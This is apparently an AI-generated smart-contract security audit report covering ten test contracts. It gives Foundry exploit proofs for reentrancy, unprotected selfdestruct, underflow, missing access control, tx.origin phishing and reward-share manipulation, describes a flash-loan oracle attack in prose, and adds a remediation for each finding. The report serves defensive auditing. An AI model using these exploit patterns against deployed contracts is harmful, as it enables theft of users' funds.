# Culpa audit — sleuth on `committed`

Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 6 proven with a landed exploit

## Summary

| Contract | Verdict | Findings |
|---|---|---|
| FlashFarm | vulnerable | logic-error (high, PROVEN) |
| GlassJaw | vulnerable | unprotected-selfdestruct (high, PROVEN) |
| HallOfMirrors | vulnerable | price-oracle-manipulation (high) |
| HollowVault | vulnerable | reentrancy (high, PROVEN) |
| Irongate | no findings | — |
| LatchGate | no findings | — |
| LooseLedger | vulnerable | arithmetic (high, PROVEN) |
| OpenTill | vulnerable | access-control (high, PROVEN) |
| OriginGate | vulnerable | tx-origin-auth (high, PROVEN) |
| TrueVault | no findings | — |

## FlashFarm — logic-error (🔴 high) · ✅ PROVEN

FlashFarm calculates reward shares based on instantaneous balances without a time-weighted average, allowing an attacker to deposit a massive stake and drain nearly the entire reward pool in a single transaction. By immediately claiming rewards and withdrawing their principal atomically, the attacker captures almost 100% of the newly funded rewards at the expense of legitimate long-term stakers.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `999999000000999999000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {FlashFarm, Token} from "@contracts/FlashFarm.sol";

contract ProveFlashFarmFlashFarmInstantaneousRewardDrain is ExploitProof {
    function test_exploit() external {
        Token stakeToken = new Token();
        Token rewardToken = new Token();
        FlashFarm farm = new FlashFarm(stakeToken, rewardToken);

        address alice = makeAddr("alice");
        address attacker = makeAddr("attacker");

        // Honest staker stakes 1 token
        stakeToken.mint(alice, 1e18);
        vm.prank(alice);
        stakeToken.approve(address(farm), 1e18);
        vm.prank(alice);
        farm.stake(1e18);

        // Reward pool funded with 1000 tokens
        rewardToken.mint(address(this), 1000e18);
        rewardToken.approve(address(farm), 1000e18);
        farm.fund(1000e18);

        // Attacker stakes a massive amount (e.g. 1,000,000 tokens)
        stakeToken.mint(attacker, 1_000_000e18);
        vm.startPrank(attacker);
        stakeToken.approve(address(farm), 1_000_000e18);
        farm.stake(1_000_000e18);
        farm.claim();
        farm.unstake(1_000_000e18);
        vm.stopPrank();

        profit = rewardToken.balanceOf(attacker);
        assertExploitLanded(900e18);
    }
}
```

**Remediation.** Re-examine the invariant the function should preserve and add property tests around it.

---

## GlassJaw — unprotected-selfdestruct (🔴 high) · ✅ PROVEN

GlassJaw lacks access control on demolish(), allowing any caller to invoke selfdestruct() directly and siphon the contract's entire native ETH balance. This instantly terminates the contract and forces a complete loss of funds.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {GlassJaw} from "@contracts/GlassJaw.sol";

contract ProveGlassJawLeadOne is ExploitProof {
    function test_exploit() external {
        GlassJaw v = new GlassJaw();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        v.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        v.demolish(attacker);

        profit = attacker.balance;
        assertExploitLanded(10 ether);
    }
}
```

**Remediation.** Guard `selfdestruct` behind an owner check, or remove it.

---

## HallOfMirrors — price-oracle-manipulation (🔴 high) · unconfirmed

An attacker implements the Borrower interface and calls QuickLoan.borrow to obtain cash flash-loan liquidity. Inside onFlashLoan, the attacker uses the borrowed cash to call MirrorPool.swapCashForStake, artificially inflating the spot price of the stake token in the AMM. The attacker then pledges a small amount of stake to PawnShop and calls PawnShop.draw to borrow massive amounts of cash against the manipulated collateral price. Finally, the attacker swaps stake back for cash in MirrorPool, repays the flash loan, and walks away with unbacked cash profit.

**Remediation.** Do not use an AMM spot price as an oracle. Use a TWAP, a dedicated price feed, or a manipulation-resistant source, and sanity-check against a second source.

---

## HollowVault — reentrancy (🔴 high) · ✅ PROVEN

HollowVault fails to follow the checks-effects-interactions pattern, allowing an attacker to recursively invoke withdraw() via a fallback function before balances are zeroed. This drains the vault's entire ETH balance in a single transaction.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {HollowVault} from "@contracts/HollowVault.sol";

contract Raider {
    HollowVault v;
    constructor(HollowVault _v) payable { v = _v; }
    function go() external { v.deposit{value: 1 ether}(); v.withdraw(); }
    receive() external payable {
        if (address(v).balance >= 1 ether) v.withdraw();
    }
}

contract ProveHollowVaultLeadOne is ExploitProof {
    function test_exploit() external {
        HollowVault v = new HollowVault();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice); v.deposit{value: 10 ether}();

        Raider raider = new Raider{value: 1 ether}(v);
        raider.go();

        profit = address(raider).balance - 1 ether;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Apply checks-effects-interactions — update state before the external call — or wrap the function in a reentrancy guard.

---

## LooseLedger — arithmetic (🔴 high) · ✅ PROVEN

An unchecked arithmetic block allows `spend()` to underflow the caller's points balance when spending more than owned, yielding near `type(uint256).max`. This grants the attacker a massive balance, enabling them to drain the contract's entire ETH reserves.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {LooseLedger} from "@contracts/LooseLedger.sol";

contract ProveLooseLedgerLeadOne is ExploitProof {
    function test_exploit() external {
        LooseLedger ledger = new LooseLedger();
        address payable attacker = payable(makeAddr("attacker"));
        
        // Fund the ledger so it has ETH to drain
        vm.deal(address(ledger), 10 ether);

        // Attacker calls spend without any points, triggering the underflow and payout
        vm.prank(attacker);
        ledger.spend(5 ether);

        profit = attacker.balance;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Remove the `unchecked` block or add explicit bounds checks; on Solidity <0.8 use SafeMath.

---

## OpenTill — access-control (🔴 high) · ✅ PROVEN

The `OpenTill.drain` function lacks access control modifiers, allowing any external actor to pass their own address as a parameter. Calling this function immediately transfers the contract's entire Ether balance to the attacker, resulting in a total loss of funds.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {OpenTill} from "@contracts/OpenTill.sol";

contract ProveOpenTillOpenTillUnprotectedDrain is ExploitProof {
    function test_exploit() external {
        OpenTill till = new OpenTill();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        till.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        till.drain(attacker);

        profit = attacker.balance;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Restrict the function to an authorized role. A function that moves funds must never be callable by an arbitrary address.

---

## OriginGate — tx-origin-auth (🔴 high) · ✅ PROVEN

The contract relied on `tx.origin` for access control, allowing an attacker to deploy a malicious intermediary contract that tricked the owner into calling it. When the victim interacted with the exploit contract, it successfully passed the `tx.origin == owner` check inside `OriginGate.withdraw` and drained all protocol funds.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {OriginGate} from "@contracts/OriginGate.sol";

contract MaliciousCaller {
    OriginGate gate;
    address payable attacker;

    constructor(OriginGate _gate, address payable _attacker) {
        gate = _gate;
        attacker = _attacker;
    }

    function attack() external {
        gate.withdraw(attacker, address(gate).balance);
    }
}

contract ProveOriginGateLeadOne is ExploitProof {
    function test_exploit() external {
        address owner = makeAddr("owner");
        address payable attacker = payable(makeAddr("attacker"));

        vm.deal(owner, 10 ether);
        
        OriginGate gate;
        vm.prank(owner);
        gate = new OriginGate{value: 10 ether}();

        MaliciousCaller malicious = new MaliciousCaller(gate, attacker);

        vm.prank(owner, owner);
        malicious.attack();

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Authenticate with `msg.sender`, never `tx.origin` — `tx.origin` lets a phished user's call be relayed by an attacker contract.

---
